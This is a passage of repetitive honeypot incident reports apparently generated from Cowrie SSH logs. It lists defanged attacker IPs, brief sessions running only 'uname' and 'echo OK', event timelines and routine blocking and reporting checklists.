### 🔴 HIGH · IR-d017d0b02b68

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:36 |
| **Last Seen** | 2026-06-27 11:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:36:29` | `cowrie.session.connect` |
| `2026-06-27 11:36:29` | `cowrie.client.version` |
| `2026-06-27 11:36:29` | `cowrie.client.kex` |
| `2026-06-27 11:36:30` | `cowrie.login.success` |
| `2026-06-27 11:36:30` | `cowrie.session.params` |
| `2026-06-27 11:36:30` | `cowrie.command.input` |
| `2026-06-27 11:36:31` | `cowrie.log.closed` |
| `2026-06-27 11:36:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92fbe4ecd755

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:37 |
| **Last Seen** | 2026-06-27 11:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:37:30` | `cowrie.session.connect` |
| `2026-06-27 11:37:30` | `cowrie.client.version` |
| `2026-06-27 11:37:30` | `cowrie.client.kex` |
| `2026-06-27 11:37:31` | `cowrie.login.success` |
| `2026-06-27 11:37:31` | `cowrie.session.params` |
| `2026-06-27 11:37:31` | `cowrie.command.input` |
| `2026-06-27 11:37:32` | `cowrie.log.closed` |
| `2026-06-27 11:37:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7b7b6de129b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:38 |
| **Last Seen** | 2026-06-27 11:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:38:31` | `cowrie.session.connect` |
| `2026-06-27 11:38:31` | `cowrie.client.version` |
| `2026-06-27 11:38:31` | `cowrie.client.kex` |
| `2026-06-27 11:38:31` | `cowrie.login.success` |
| `2026-06-27 11:38:32` | `cowrie.session.params` |
| `2026-06-27 11:38:32` | `cowrie.command.input` |
| `2026-06-27 11:38:32` | `cowrie.log.closed` |
| `2026-06-27 11:38:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fce63e19fd4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:39 |
| **Last Seen** | 2026-06-27 11:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:39:29` | `cowrie.session.connect` |
| `2026-06-27 11:39:29` | `cowrie.client.version` |
| `2026-06-27 11:39:29` | `cowrie.client.kex` |
| `2026-06-27 11:39:29` | `cowrie.login.success` |
| `2026-06-27 11:39:30` | `cowrie.session.params` |
| `2026-06-27 11:39:30` | `cowrie.command.input` |
| `2026-06-27 11:39:30` | `cowrie.log.closed` |
| `2026-06-27 11:39:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c1381375550

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:40 |
| **Last Seen** | 2026-06-27 11:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:40:26` | `cowrie.session.connect` |
| `2026-06-27 11:40:26` | `cowrie.client.version` |
| `2026-06-27 11:40:27` | `cowrie.client.kex` |
| `2026-06-27 11:40:27` | `cowrie.login.success` |
| `2026-06-27 11:40:28` | `cowrie.session.params` |
| `2026-06-27 11:40:28` | `cowrie.command.input` |
| `2026-06-27 11:40:28` | `cowrie.log.closed` |
| `2026-06-27 11:40:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a2db4a81ba9

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:41 |
| **Last Seen** | 2026-06-27 11:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:41:29` | `cowrie.session.connect` |
| `2026-06-27 11:41:29` | `cowrie.client.version` |
| `2026-06-27 11:41:29` | `cowrie.client.kex` |
| `2026-06-27 11:41:29` | `cowrie.login.success` |
| `2026-06-27 11:41:30` | `cowrie.session.params` |
| `2026-06-27 11:41:30` | `cowrie.command.input` |
| `2026-06-27 11:41:30` | `cowrie.log.closed` |
| `2026-06-27 11:41:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc3fcda04988

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:42 |
| **Last Seen** | 2026-06-27 11:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:42:29` | `cowrie.session.connect` |
| `2026-06-27 11:42:29` | `cowrie.client.version` |
| `2026-06-27 11:42:29` | `cowrie.client.kex` |
| `2026-06-27 11:42:29` | `cowrie.login.success` |
| `2026-06-27 11:42:30` | `cowrie.session.params` |
| `2026-06-27 11:42:30` | `cowrie.command.input` |
| `2026-06-27 11:42:30` | `cowrie.log.closed` |
| `2026-06-27 11:42:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c433badedb99

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:43 |
| **Last Seen** | 2026-06-27 11:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:43:30` | `cowrie.session.connect` |
| `2026-06-27 11:43:30` | `cowrie.client.version` |
| `2026-06-27 11:43:30` | `cowrie.client.kex` |
| `2026-06-27 11:43:31` | `cowrie.login.success` |
| `2026-06-27 11:43:31` | `cowrie.session.params` |
| `2026-06-27 11:43:31` | `cowrie.command.input` |
| `2026-06-27 11:43:31` | `cowrie.log.closed` |
| `2026-06-27 11:43:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6036c34eec7a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:44 |
| **Last Seen** | 2026-06-27 11:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:44:32` | `cowrie.session.connect` |
| `2026-06-27 11:44:32` | `cowrie.client.version` |
| `2026-06-27 11:44:33` | `cowrie.client.kex` |
| `2026-06-27 11:44:33` | `cowrie.login.success` |
| `2026-06-27 11:44:34` | `cowrie.session.params` |
| `2026-06-27 11:44:34` | `cowrie.command.input` |
| `2026-06-27 11:44:34` | `cowrie.log.closed` |
| `2026-06-27 11:44:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d596f2c7fff

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 11:44 |
| **Last Seen** | 2026-06-27 11:45 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:44:53` | `cowrie.session.connect` |
| `2026-06-27 11:44:54` | `cowrie.client.version` |
| `2026-06-27 11:44:54` | `cowrie.client.kex` |
| `2026-06-27 11:44:59` | `cowrie.login.success` |
| `2026-06-27 11:45:02` | `cowrie.session.params` |
| `2026-06-27 11:45:02` | `cowrie.command.input` |
| `2026-06-27 11:45:04` | `cowrie.log.closed` |
| `2026-06-27 11:45:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd2fd3578abc

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-27 11:45 |
| **Last Seen** | 2026-06-27 11:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:45:04` | `cowrie.session.connect` |
| `2026-06-27 11:45:04` | `cowrie.client.version` |
| `2026-06-27 11:45:04` | `cowrie.client.kex` |
| `2026-06-27 11:45:06` | `cowrie.login.success` |
| `2026-06-27 11:45:07` | `cowrie.session.params` |
| `2026-06-27 11:45:07` | `cowrie.command.input` |
| `2026-06-27 11:45:07` | `cowrie.log.closed` |
| `2026-06-27 11:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cd2a7288e55

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:45 |
| **Last Seen** | 2026-06-27 11:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:45:33` | `cowrie.session.connect` |
| `2026-06-27 11:45:33` | `cowrie.client.version` |
| `2026-06-27 11:45:33` | `cowrie.client.kex` |
| `2026-06-27 11:45:33` | `cowrie.login.success` |
| `2026-06-27 11:45:34` | `cowrie.session.params` |
| `2026-06-27 11:45:34` | `cowrie.command.input` |
| `2026-06-27 11:45:34` | `cowrie.log.closed` |
| `2026-06-27 11:45:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f15e3f62120

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:46 |
| **Last Seen** | 2026-06-27 11:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:46:33` | `cowrie.session.connect` |
| `2026-06-27 11:46:33` | `cowrie.client.version` |
| `2026-06-27 11:46:33` | `cowrie.client.kex` |
| `2026-06-27 11:46:33` | `cowrie.login.success` |
| `2026-06-27 11:46:34` | `cowrie.session.params` |
| `2026-06-27 11:46:34` | `cowrie.command.input` |
| `2026-06-27 11:46:34` | `cowrie.log.closed` |
| `2026-06-27 11:46:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c030d85d52b9

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:47 |
| **Last Seen** | 2026-06-27 11:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:47:33` | `cowrie.session.connect` |
| `2026-06-27 11:47:33` | `cowrie.client.version` |
| `2026-06-27 11:47:33` | `cowrie.client.kex` |
| `2026-06-27 11:47:33` | `cowrie.login.success` |
| `2026-06-27 11:47:34` | `cowrie.session.params` |
| `2026-06-27 11:47:34` | `cowrie.command.input` |
| `2026-06-27 11:47:34` | `cowrie.log.closed` |
| `2026-06-27 11:47:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9a7eab84c55

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:48 |
| **Last Seen** | 2026-06-27 11:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:48:37` | `cowrie.session.connect` |
| `2026-06-27 11:48:37` | `cowrie.client.version` |
| `2026-06-27 11:48:37` | `cowrie.client.kex` |
| `2026-06-27 11:48:37` | `cowrie.login.success` |
| `2026-06-27 11:48:38` | `cowrie.session.params` |
| `2026-06-27 11:48:38` | `cowrie.command.input` |
| `2026-06-27 11:48:38` | `cowrie.log.closed` |
| `2026-06-27 11:48:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-641c0242c391

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:49 |
| **Last Seen** | 2026-06-27 11:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:49:40` | `cowrie.session.connect` |
| `2026-06-27 11:49:40` | `cowrie.client.version` |
| `2026-06-27 11:49:40` | `cowrie.client.kex` |
| `2026-06-27 11:49:40` | `cowrie.login.success` |
| `2026-06-27 11:49:41` | `cowrie.session.params` |
| `2026-06-27 11:49:41` | `cowrie.command.input` |
| `2026-06-27 11:49:41` | `cowrie.log.closed` |
| `2026-06-27 11:49:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ad377576b46

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-06-27 11:50 |
| **Last Seen** | 2026-06-27 11:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:50:28` | `cowrie.session.connect` |
| `2026-06-27 11:50:28` | `cowrie.client.version` |
| `2026-06-27 11:50:29` | `cowrie.client.kex` |
| `2026-06-27 11:50:29` | `cowrie.login.success` |
| `2026-06-27 11:50:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-642ae2d1a6f9

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-06-27 11:50 |
| **Last Seen** | 2026-06-27 11:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:50:29` | `cowrie.session.connect` |
| `2026-06-27 11:50:29` | `cowrie.client.version` |
| `2026-06-27 11:50:29` | `cowrie.client.kex` |
| `2026-06-27 11:50:30` | `cowrie.login.success` |
| `2026-06-27 11:50:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7f5f56071e0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:50 |
| **Last Seen** | 2026-06-27 11:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:50:44` | `cowrie.session.connect` |
| `2026-06-27 11:50:44` | `cowrie.client.version` |
| `2026-06-27 11:50:44` | `cowrie.client.kex` |
| `2026-06-27 11:50:44` | `cowrie.login.success` |
| `2026-06-27 11:50:45` | `cowrie.session.params` |
| `2026-06-27 11:50:45` | `cowrie.command.input` |
| `2026-06-27 11:50:45` | `cowrie.log.closed` |
| `2026-06-27 11:50:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69629a721d58

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:51 |
| **Last Seen** | 2026-06-27 11:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:51:50` | `cowrie.session.connect` |
| `2026-06-27 11:51:50` | `cowrie.client.version` |
| `2026-06-27 11:51:50` | `cowrie.client.kex` |
| `2026-06-27 11:51:50` | `cowrie.login.success` |
| `2026-06-27 11:51:51` | `cowrie.session.params` |
| `2026-06-27 11:51:51` | `cowrie.command.input` |
| `2026-06-27 11:51:51` | `cowrie.log.closed` |
| `2026-06-27 11:51:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88508524501e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:52 |
| **Last Seen** | 2026-06-27 11:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:52:56` | `cowrie.session.connect` |
| `2026-06-27 11:52:56` | `cowrie.client.version` |
| `2026-06-27 11:52:56` | `cowrie.client.kex` |
| `2026-06-27 11:52:56` | `cowrie.login.success` |
| `2026-06-27 11:52:57` | `cowrie.session.params` |
| `2026-06-27 11:52:57` | `cowrie.command.input` |
| `2026-06-27 11:52:57` | `cowrie.log.closed` |
| `2026-06-27 11:52:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b72dc9feb6dd

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:53 |
| **Last Seen** | 2026-06-27 11:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:53:57` | `cowrie.session.connect` |
| `2026-06-27 11:53:57` | `cowrie.client.version` |
| `2026-06-27 11:53:57` | `cowrie.client.kex` |
| `2026-06-27 11:53:58` | `cowrie.login.success` |
| `2026-06-27 11:53:58` | `cowrie.session.params` |
| `2026-06-27 11:53:58` | `cowrie.command.input` |
| `2026-06-27 11:53:59` | `cowrie.log.closed` |
| `2026-06-27 11:53:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22a6f8fff925

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:55 |
| **Last Seen** | 2026-06-27 11:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:55:00` | `cowrie.session.connect` |
| `2026-06-27 11:55:00` | `cowrie.client.version` |
| `2026-06-27 11:55:00` | `cowrie.client.kex` |
| `2026-06-27 11:55:00` | `cowrie.login.success` |
| `2026-06-27 11:55:01` | `cowrie.session.params` |
| `2026-06-27 11:55:01` | `cowrie.command.input` |
| `2026-06-27 11:55:01` | `cowrie.log.closed` |
| `2026-06-27 11:55:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e11ff2b027c6

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 11:56 |
| **Last Seen** | 2026-06-27 11:56 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:56:00` | `cowrie.session.connect` |
| `2026-06-27 11:56:02` | `cowrie.client.version` |
| `2026-06-27 11:56:02` | `cowrie.client.kex` |
| `2026-06-27 11:56:07` | `cowrie.login.success` |
| `2026-06-27 11:56:12` | `cowrie.session.params` |
| `2026-06-27 11:56:12` | `cowrie.command.input` |
| `2026-06-27 11:56:13` | `cowrie.log.closed` |
| `2026-06-27 11:56:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8366e7ba232

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:56 |
| **Last Seen** | 2026-06-27 11:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:56:06` | `cowrie.session.connect` |
| `2026-06-27 11:56:06` | `cowrie.client.version` |
| `2026-06-27 11:56:06` | `cowrie.client.kex` |
| `2026-06-27 11:56:07` | `cowrie.login.success` |
| `2026-06-27 11:56:07` | `cowrie.session.params` |
| `2026-06-27 11:56:07` | `cowrie.command.input` |
| `2026-06-27 11:56:08` | `cowrie.log.closed` |
| `2026-06-27 11:56:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48e4505edc14

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 11:57 |
| **Last Seen** | 2026-06-27 11:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 11:57:17` | `cowrie.session.connect` |
| `2026-06-27 11:57:17` | `cowrie.client.version` |
| `2026-06-27 11:57:17` | `cowrie.client.kex` |
| `2026-06-27 11:57:17` | `cowrie.login.success` |
| `2026-06-27 11:57:18` | `cowrie.session.params` |
| `2026-06-27 11:57:18` | `cowrie.command.input` |
| `2026-06-27 11:57:18` | `cowrie.log.closed` |
| `2026-06-27 11:57:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f16b4cebdc0e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]13` |
| **First Seen** | 2026-06-27 11:57 |
